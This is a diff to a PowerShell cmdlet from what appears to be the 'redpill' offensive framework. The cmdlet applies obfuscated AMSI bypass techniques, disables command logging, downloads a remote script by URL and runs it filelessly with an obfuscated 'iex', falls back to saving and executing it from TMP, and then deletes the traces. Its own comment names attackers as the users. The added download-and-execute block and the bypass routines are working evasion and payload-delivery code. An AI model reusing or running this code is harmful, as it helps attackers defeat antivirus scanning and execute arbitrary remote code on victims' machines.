@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v2.4.11
+   PS cmdlet Dev version: v2.5.12
    
 .DESCRIPTION
    This cmdlet tests an internal list of amsi_bypass_technics on
@@ -69,31 +69,32 @@
    Disclosure  : @mattifestation
    Description : DLL_REFLECTION
    POC         : Execute: ----
-   Remark      : string detection successfully disabled
+   Remark      : string detection disabled!
 
    Id          : 3
    bypass      : success
    Disclosure  : @mattifestation
    Description : FORCE_AMSI_ERROR
    POC         : Execute: ----
-   Remark      : string detection successfully disabled 
+   Remark      : string detection disabled!
    
    Id          : 4
    bypass      : success
    Disclosure  : @_RastaMouse
    Description : AMSI_RESULT_CLEAN
    POC         : Execute: ----
-   Remark      : string detection successfully disabled
+   Remark      : string detection disabled!
 
    Id          : 5
    bypass      : success
    Disclosure  : @am0nsec
    Description : AMSI_SCANBUFFER_PATCH
    POC         : Execute: ----
-   Remark      : string detection successfully disabled 
+   Remark      : string detection disabled! 
 
 .LINK
    https://github.com/r00t-3xp10it/redpill
+   https://news.sophos.com/en-us/2021/06/02/amsi-bypasses-remain-tricks-of-the-malware-trade
 #>
 
 
@@ -106,7 +107,7 @@
 
 
 $viriato='0'#Redpill Conf
-$CmdletVersion = "v2.4.11"
+$CmdletVersion = "v2.5.12"
 ## Global cmdlet variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -301,7 +302,7 @@ If($Action -ieq "Bypass")
                               "@mattifestation",
                               "DL`L_REFL`ECTI`ON",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
@@ -364,7 +365,7 @@ If($Action -ieq "Bypass")
                               "@mattifestation",
                               "FORCE_AM`SI_ERROR",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
@@ -448,7 +449,7 @@ If($Action -ieq "Bypass")
                               "@_RastaMouse",
                               "AM`SI_RES`ULT_CLEAN",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
@@ -578,7 +579,7 @@ If($Action -ieq "Bypass")
                               "@am0nsec",
                               "AM`SI_SCANBUF`FER_PATCH",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Dis play Output Table
             $mytable|Format-List > $env:TMP\tbl.log
@@ -719,7 +720,7 @@ If($Action -ieq "TestAll")
                               "@mattifestation",
                               "DL`L_REFL`ECTI`ON",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Display Output Table
             $mytable | Format-List > $env:TMP\tbl.log
@@ -778,7 +779,7 @@ If($Action -ieq "TestAll")
                               "@mattifestation",
                               "FORCE_AM`SI_ERROR",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Display Output Table
             $mytable | Format-List > $env:TMP\tbl.log
@@ -858,7 +859,7 @@ If($Action -ieq "TestAll")
                               "@_RastaMouse",
                               "AM`SI_RES`ULT_CLEAN",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Display Output Table
             $mytable | Format-List > $env:TMP\tbl.log
@@ -984,7 +985,7 @@ If($Action -ieq "TestAll")
                               "@am0nsec",
                               "AM`SI_SCANBUFF`ER_PATCH",
                               "Execute: `"$JPGformat`"",
-                              "string detection bypassed!")|Out-Null
+                              "string detection disabled!")|Out-Null
 
             #Display Output Table
             $mytable | Format-List > $env:TMP\tbl.log
@@ -1020,6 +1021,17 @@ If($PayloadURL -ne "false")
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Download\Execute URL script.ps1 trougth AMS1_bypass!
+
+   .NOTES
+      This function does NOT accepts downloaded cmdlet arguments!
+      But if you wish to execute the downloaded cmdlet with parameters then
+      manualy edit NoAmsi.ps1 cmdlet and append the arguments to the follow line:
+
+      #Executing cmdlet
+      Import-Module -Name .\$RawName.ps1 -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
+
+   .NOTES
+      redpill framework allow attackers to execute the -payloadURL '<url>' with args!
    #>
 
    #Parse URL data
@@ -1055,7 +1067,25 @@ If($PayloadURL -ne "false")
    Write-Host "     uri: $PayloadURL`n" -ForegroundColor DarkCyan 
 
    #Msxml2-Proxy-Downloader { FileLess }
-   $TORnetwork=New-Object -ComObject Msxml2.XMLHTTP;$TORnetwork.open('GET',"$PayloadURL",$false);$TORnetwork.send();i`ex $TORnetwork.responseText;&"$RawName"
-   Write-Host ""
+   $TORnetwork=New-Object -ComObject Msxml2.XMLHTTP;$TORnetwork.open('GET',"$PayloadURL",$false);$TORnetwork.send();i`ex $TORnetwork.responseText
+
+   try{#Executing cmdlet
+      Import-Module -Name .\$RawName.ps1 -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
+   }catch{
+      iwr -Uri "$PayloadURL" -OutFile "$Env:TMP\$RawName.ps1"
+      Start-Sleep -Seconds 3;&"$Env:TMP\$RawName.ps1" #<INPUT_CMDLET_ARGUMENT_LIST>   
+   }
+
+   If(-not($?))
+   {
+      Write-Host "[error] something went wrong executing\downloading $RawName.ps1!`n" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "";exit ## @NoAmsi
+   }
                        
+}
+
+## Delete artifacts left behind
+If(Test-Path -Path "$Env:TMP\$RawName.ps1" -ErrorAction SilentlyContinue)
+{
+   Remove-Item -Path "$Env:TMP\$RawName.ps1" -Force
 }
